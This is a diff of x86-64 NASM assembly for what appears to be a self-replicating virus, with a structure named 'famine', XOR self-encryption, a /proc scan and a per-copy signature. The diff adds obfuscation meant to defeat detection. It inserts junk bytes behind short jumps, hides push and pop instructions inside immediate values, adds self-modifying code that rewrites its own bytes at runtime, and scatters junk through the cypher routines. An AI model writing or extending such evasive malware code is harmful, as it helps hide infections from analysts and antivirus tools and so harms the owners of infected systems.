@@ -53,14 +53,24 @@
 %define RETURN_JUMP_OFFSET	_end - _exx
 %define RETURN_JUMP_VALUE_OFFSET _end - _exx - + 5
 
-%define SIGNATURE_OFFSET	signature - _start + 41
+%define SIGNATURE_OFFSET	signature - _start + 40
 
 
 ; MACROS
 
 %macro OBF_GENERIC 0
 jmp short 0x2
-db 0x0f
+db 0x0F
+%endmacro
+
+%macro OBF_GENERIC1 0
+jmp short 0x2
+db 0xDE
+%endmacro
+
+%macro OBF_GENERIC2 0
+jmp short 0x2
+db 0xF3
 %endmacro
 
 %macro OBF_PUSH_RAX 0
@@ -115,6 +125,18 @@ db 0x0f
 	dd 0x5041A0F6
 %endmacro
 
+%macro OBF_PUSH_R9 0
+	jmp short 4
+	db 0x02
+	dd 0x5141C3EB
+%endmacro
+
+%macro OBF_PUSH_R10 0
+	jmp short 4
+	db 0x02
+	dd 0x5241C3D0
+%endmacro
+
 %macro OBF_OVERWRITE_PUSHR8R9 0
 	OBF_PUSH_R8
 	call .pop
@@ -155,6 +177,112 @@ db 0x0f
 	dd 0xEEA0C3F1
 %endmacro
 
+%macro OBF_OVERWRITE_POPR9R8 0
+	OBF_PUSH_R8
+	call .pop4
+	.pop4:
+	pop r8
+	mov dword[r8+12], 0x58415941
+	pop r8
+	dd 0xADE1F1FF
+%endmacro
+
+%macro OBF_OVERWRITE_POPR11R10 0
+	OBF_PUSH_R8
+	call .pop5
+	.pop5:
+	pop r8
+	mov dword[r8+12], 0x5A415B41
+	pop r8
+	dd 0xFFADE1F1
+%endmacro
+
+%macro OBF_OVERWRITE_POPR13R12 0
+	OBF_PUSH_RDI
+	call .pop6
+	.pop6:
+	pop rdi
+	mov dword[rdi+9], 0x5C415D41
+	pop rdi
+	dd 0xEEA0FDF1
+%endmacro
+
+%macro OBF_OVERWRITE_POPR15R14 0
+	OBF_PUSH_RDI
+	call .pop7
+	.pop7:
+	pop rdi
+	mov dword[rdi+9], 0x5E415F41
+	pop rdi
+	dd 0xEEA0C3F1
+%endmacro
+
+
+
+%macro OBF_POP_RAX 0
+	jmp short 5
+	push 0x580fDD90
+%endmacro
+
+
+%macro OBF_POP_RBX 0
+	jmp short 5
+	push 0x5B909090
+%endmacro
+
+%macro OBF_POP_RCX 0
+	jmp short 5
+	push 0x5941442F
+%endmacro
+
+%macro OBF_POP_RDX 0
+	jmp short 6
+	db 0xF8
+	push 0x5A26EDA0
+%endmacro
+
+%macro OBF_POP_RSI 0
+	jmp short 5
+	db 0xF8
+	dd 0x5E666EFC
+%endmacro
+
+%macro OBF_POP_RDI 0
+	jmp short 5
+	db 0x0f
+	dd 0x5FE4E4c3
+%endmacro
+
+%macro OBF_POP_RBP 0
+	jmp short 5
+	db 0x03
+	dd 0x5DCCEFFF
+%endmacro
+
+%macro OBF_POP_RSP 0
+	jmp short 5
+	db 0x03
+	dd 0x5C3AEF6C
+%endmacro
+
+%macro OBF_POP_R8 0
+	jmp short 4
+	db 0x02
+	dd 0x5841A0F6
+%endmacro
+
+%macro OBF_POP_R9 0
+	jmp short 4
+	db 0x02
+	dd 0x5941C3EB
+%endmacro
+
+%macro OBF_POP_R10 0
+	jmp short 4
+	db 0x02
+	dd 0x5A41C3D0
+%endmacro
+
 %macro PUSH 0
 	OBF_PUSH_RAX
 	OBF_PUSH_RBX
@@ -170,35 +298,36 @@ db 0x0f
 	OBF_OVERWRITE_PUSHR12R13
 	OBF_OVERWRITE_PUSHR14R15
 %endmacro
+
 %macro POP 0
-	pop r15
-	pop r14
-	pop r13
-	pop r12
-	pop r11
-	pop r10
-	pop r9
-	pop r8
-	pop rsp
-	pop rbp
-	pop rdi
-	pop rsi
-	pop rdx
-	pop rcx
-	pop rbx
-	pop rax
+	OBF_OVERWRITE_POPR15R14
+	OBF_OVERWRITE_POPR13R12
+	OBF_OVERWRITE_POPR11R10
+	OBF_OVERWRITE_POPR9R8
+	OBF_POP_RSP
+	OBF_POP_RBP
+	OBF_POP_RDI
+	OBF_POP_RSI
+	OBF_GENERIC
+	OBF_POP_RDX
+	OBF_POP_RCX
+	OBF_POP_RBX
+	OBF_POP_RAX
 %endmacro
 
 
 
 %macro CYPHER 0
+	OBF_GENERIC
 	xor r11, r11
 	mov rdi, STACK(famine.key)  ; key
+	OBF_GENERIC2
 	mov rax, _start.enc_start
 	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
 	mov rcx, enc_end
 	sub rcx, rax
 	mov r12, STACK(famine.factor)
+	OBF_GENERIC
 	.cyphering:
 		mov r11b, byte [rdx]
 		xor r11, rdi
@@ -211,10 +340,12 @@ db 0x0f
 
 %macro DECYPHER 0
 	xor r11, r11
+	OBF_GENERIC1
 	.key_offset:
 	mov rdi, 0xAA  ; key
 	mov rax, .enc_start
 	lea rdx, [rel .enc_start]
+	OBF_GENERIC2
 	mov rcx, enc_end
 	sub rcx, rax
 	.factor_offset:
@@ -223,6 +354,7 @@ db 0x0f
 		mov r11b, byte [rdx]
 		xor r11, rdi
 		mov byte [rdx], r11b
+	OBF_GENERIC
 		inc rdx
 		dec r12
 		add rdi, r12
@@ -310,7 +442,8 @@ db 0x0f
 .tocypher		resb	0x5000			; location to cyphered v
 .key			resb	1				; location to key
 .factor			resb	1				; factor to derivate key
-.morph_sign		resb	1				; factor to add to signature
+.morph_sign_u	resb	1				; factor to add to signature
+.morph_sign_d	resb	1				; factor to add to ssignature  tenth
 .commpath		resb	100				; path to commfiles
 .dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
 endstruc
